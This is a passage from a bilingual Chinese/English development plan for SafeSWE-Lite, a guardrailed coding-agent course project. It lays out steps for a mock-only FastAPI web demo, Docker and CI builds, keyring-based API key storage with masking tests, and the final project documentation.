ALLOW_REAL_LLM = os.getenv("SAFE_SWE_LITE_ALLOW_REAL_LLM", "false").lower() == "true"


def _run_task(task_name: str) -> dict:
    task_file = REPO_ROOT / "examples" / "tasks" / f"{task_name}.json"
    task = json.loads(task_file.read_text(encoding="utf-8"))
    workspace = REPO_ROOT / "examples" / "sample_project"
    model = MockLLM(outputs=task["mock_outputs"])
    tools = Dispatcher(workspace=workspace)
    chain = GuardrailChain(workspace=workspace)
    agent = Agent(model=model, tools=tools, guardrail=chain, max_steps=task["max_steps"])
    return agent.run(task["task"])


def create_app() -> FastAPI:
    app = FastAPI(title="SafeSWE-Lite")

    @app.get("/api/health")
    def health():
        return {"status": "ok", "mock_only": not ALLOW_REAL_LLM}

    @app.post("/api/demo/fix-bug")
    def fix_bug():
        return _run_task("fix_bug")

    @app.post("/api/demo/blocked")
    def blocked():
        return _run_task("blocked_dangerous_action")

    app.mount("/", StaticFiles(directory=STATIC_DIR, html=True), name="static")
    return app


def run_server(port: int = 8000):
    import uvicorn
    uvicorn.run(create_app(), host="0.0.0.0", port=port)


app = create_app()
```

- [ ] **Step 4: 写静态页**

`index.html`（骨架）:
```html
<!doctype html>
<html lang="zh">
<head>
  <meta charset="utf-8">
  <title>SafeSWE-Lite</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <main>
    <h1>SafeSWE-Lite</h1>
    <p class="subtitle">A lightweight coding agent harness with deterministic guardrails</p>
    <div class="buttons">
      <button id="fix-bug">Run: Fix Bug Demo</button>
      <button id="blocked">Run: Blocked Action Demo</button>
    </div>
    <pre id="trace">// Click a button to run a mock demo. All steps are deterministic — no network, no API key.</pre>
    <a id="download" download="trace.json">Download trace JSON</a>
  </main>
  <script src="app.js"></script>
</body>
</html>
```

`style.css`（骨架）:
```css
body { font-family: system-ui, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; }
button { margin-right: 0.5rem; padding: 0.5rem 1rem; cursor: pointer; }
#trace { background: #111; color: #0f0; padding: 1rem; min-height: 300px; overflow: auto; white-space: pre-wrap; }
#download { display: inline-block; margin-top: 1rem; }
```

`app.js`:
```js
let lastTrace = null;

async function runDemo(name) {
  const traceEl = document.getElementById("trace");
  traceEl.textContent = "Running " + name + " demo (mock mode)...";
  const response = await fetch("/api/demo/" + name, { method: "POST" });
  const data = await response.json();
  lastTrace = data;
  traceEl.textContent = JSON.stringify(data, null, 2);
  document.getElementById("download").href =
    URL.createObjectURL(new Blob([JSON.stringify(data, null, 2)], { type: "application/json" }));
}

document.getElementById("fix-bug").onclick = () => runDemo("fix-bug");
document.getElementById("blocked").onclick = () => runDemo("blocked");
```

- [ ] **Step 5: 跑测试确认通过**

Run: `pytest tests/test_web_app.py -v`
Expected: 4 passed

- [ ] **Step 6: Commit**

```bash
git add src/safe_swe_lite/web/ tests/test_web_app.py
git commit -m "feat: FastAPI web UI with mock-only demo endpoints"
```

---

## Task 16: Docker 分发 + CI 构建

**Files:**
- Create: `Dockerfile`, `.dockerignore`，修改 `.github/workflows/ci.yml`

- [ ] **Step 1: 写 Dockerfile**

```dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY pyproject.toml README.md ./
COPY src ./src
COPY examples ./examples
COPY config ./config

RUN pip install --no-cache-dir -e ".[web]"

EXPOSE 8000

ENTRYPOINT ["safe-swe-lite"]
CMD ["web"]
```

`.dockerignore`:
```
.git
.venv
__pycache__
*.pyc
.env
.omc
course
docs
tests
```

- [ ] **Step 2: CI 追加 docker-build job**

在 `ci.yml` 末尾追加：
```yaml
  docker-build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t safe-swe-lite:ci .
```

- [ ] **Step 3: 本地验证 Docker 构建**

Run: `docker build -t safe-swe-lite . && docker run -d -p 8000:8000 --name ssl-test safe-swe-lite`
Run: `curl http://localhost:8000/api/health`
Expected: `{"status":"ok",...}`
Run: `docker stop ssl-test && docker rm ssl-test`

- [ ] **Step 4: Commit**

```bash
git add Dockerfile .dockerignore .github/workflows/ci.yml
git commit -m "feat: Dockerfile distribution and CI docker build job"
```

---

## Task 17: 真实 LLM Provider + 凭据安全

**Files:**
- Create: `src/safe_swe_lite/llm/litellm_provider.py`, `.env.example`, `tests/test_credentials.py`

- [ ] **Step 1: 写失败测试（全部离线，不调真实 API）**

```python
# tests/test_credentials.py
from safe_swe_lite.llm.litellm_provider import (
    ApiKeyNotFound, get_api_key, resolve_api_key, mask_key,
)


def test_mask_key_hides_secret():
    assert mask_key("sk-abc123def456") == "sk-abc1...f456"


def test_resolve_api_key_env_var(monkeypatch):
    monkeypatch.setenv("SAFE_SWE_LITE_API_KEY", "sk-test")
    assert resolve_api_key() == "sk-test"


def test_resolve_api_key_raises_when_missing(monkeypatch):
    for var in ("SAFE_SWE_LITE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY"):
        monkeypatch.delenv(var, raising=False)
    import safe_swe_lite.llm.litellm_provider as lp
    monkeypatch.setattr(lp.keyring, "get_password", lambda *a, **k: None)
    try:
        resolve_api_key()
        assert False, "should raise"
    except ApiKeyNotFound:
        pass


def test_get_api_key_prefers_keyring_over_env(monkeypatch):
    import safe_swe_lite.llm.litellm_provider as lp
    monkeypatch.setenv("SAFE_SWE_LITE_API_KEY", "sk-from-env")
    monkeypatch.setattr(lp.keyring, "get_password", lambda *a, **k: "sk-from-keyring")
    assert get_api_key() == "sk-from-keyring"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_credentials.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 litellm_provider.py 与 .env.example**

`src/safe_swe_lite/llm/litellm_provider.py`:
```python
"""Real LLM provider via litellm + keyring credential storage."""

import getpass
import os

import keyring

SERVICE_NAME = "safe-swe-lite"
ENV_KEY_NAMES = ("SAFE_SWE_LITE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY")


class ApiKeyNotFound(Exception):
    pass


def mask_key(key: str) -> str:
    if len(key) <= 10:
        return "*" * len(key)
    return f"{key[:6]}...{key[-4:]}"


def get_api_key() -> str:
    """Keyring first, environment fallback. Never returns masked value."""
    stored = keyring.get_password(SERVICE_NAME, "api_key")
    if stored:
        return stored
    for name in ENV_KEY_NAMES:
        value = os.getenv(name)
        if value:
            return value
    raise ApiKeyNotFound(
        "no API key found. Run 'safe-swe-lite auth' or set SAFE_SWE_LITE_API_KEY"
    )


def resolve_api_key() -> str:
    return get_api_key()


def auth_command() -> None:
    print("Enter your API key (input is hidden):")
    key = getpass.getpass("API key: ").strip()
    if not key:
        print("aborted: empty key")
        return
    keyring.set_password(SERVICE_NAME, "api_key", key)
    print(f"saved. status: configured (masked: {mask_key(key)})")
```

`.env.example`:
```bash
# Copy to .env and fill in — fallback only, keyring is preferred.
SAFE_SWE_LITE_API_KEY=
SAFE_SWE_LITE_MODEL=anthropic/claude-sonnet-4-5
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pip install -e ".[llm]"` 然后 `pytest tests/test_credentials.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/llm/litellm_provider.py .env.example tests/test_credentials.py
git commit -m "feat: real LLM provider with keyring credential storage"
```

---

## Task 18: 文档收尾（README / AGENT_LOG / SPEC_PROCESS / REFLECTION）

**Files:**
- Create: `README.md`（完整版）, `AGENT_LOG.md`（补齐所有 task 记录）, `SPEC_PROCESS.md`, `REFLECTION.md`（由用户撰写，AI 只搭骨架）

- [ ] **Step 1: 写 README.md**

内容章节（课程硬性要求）：项目简介、安装、运行（CLI + WebUI + Docker）、测试命令、目录结构、安全边界（护栏四层 + 凭据说明）、CI/CD 链接、线上 URL、已知限制、第三方代码许可引用（SWE-agent / mini-swe-agent / Aider / AutoCodeRover / Agentless 均需列出）。

- [ ] **Step 2: 补齐 AGENT_LOG.md**

按 GIT_CICD_DEVELOPMENT_WORKFLOW.md 的格式：每个 task 记录时间戳、触发的技能、关键 prompt、commit hash、人工干预。

- [ ] **Step 3: 写 SPEC_PROCESS.md**

记录 brainstorming 关键节点、冷启动验证结果（Phase 0.5 用另一个 agent 跑 1-2 task）、SPEC/PLAN 修订 diff。

- [ ] **Step 4: REFLECTION.md 骨架**

仅搭 8 个问题的标题骨架，正文由用户本人撰写（课程学术规范要求）。

- [ ] **Step 5: Commit**

```bash
git add README.md AGENT_LOG.md SPEC_PROCESS.md REFLECTION.md
git commit -m "docs: complete course deliverables"
```

---

## Self-Review

**1. Spec coverage 对照：**

| SPEC 章节 | 对应 Task |
|---|---|
| §3.2 主循环 | Task 4 |
| §3.3 动作协议 | Task 2 |
| §3.4 护栏 L1-L4 | Task 6, 7, 8, 9 |
| §3.5 反馈闭环 | Task 10 |
| §3.6 记忆 | Task 11 |
| §3.7 配置 | Task 12 |
| §3.8 CLI/WebUI | Task 13, 15 |
| §7 凭据与分发 | Task 16, 17 |
| §A.6 机制演示 | Task 14 |
| AC-11 CI | Task 1, 16 |
| AC-13 线上部署 | 部署配置在 CI/CD 阶段手动完成（Render 控制台） |

**2. Placeholder scan：** 无 TBD/TODO；每个代码步骤含完整代码。

**3. Type consistency：** `Action(name, parameters)`、`GuardrailDecision(blocked, layer, reason, hitl_state)`、`ToolResult(success, output, exit_code, error)`、`ValidationResult(passed, validator, file, line, message, context, details)` 在所有 task 中命名一致。Agent 构造签名 `Agent(model, tools, max_steps, max_format_errors, guardrail, validators, memory)` 在 Task 4/14/15 中一致。

**已知简化（记录在 README 的已知限制中）：**
- embedding 检索层（SPEC §3.6 可选层）默认关闭，本 PLAN 未排 task；时间余量时作为 Task 19 追加
- LLM-as-Judge 护栏补充层（SPEC §3.4）默认关闭，仅写入 REFLECTION 讨论
- Render 线上部署需用户在控制台手动连接仓库（无法从代码仓库内自动化）
